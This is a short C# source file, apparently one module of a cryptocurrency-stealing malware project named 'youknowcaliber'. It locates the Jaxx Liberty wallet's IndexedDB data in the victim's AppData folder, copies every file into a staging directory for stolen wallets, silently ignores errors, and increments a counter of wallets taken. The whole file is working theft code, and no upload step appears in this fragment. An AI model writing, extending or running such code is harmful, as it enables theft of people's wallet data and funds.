using System.IO;

namespace youknowcaliber
{
    class Jaxx
    {
        public static int count = 0;
        public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
        public static void JaxxStr(string directorypath)  // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + JaxxDir);
                    file.CopyTo(directorypath + JaxxDir + file.Name);
                }
                count++;
                Counting.Wallets++;
            }
            catch { return; }
        }
    }
}
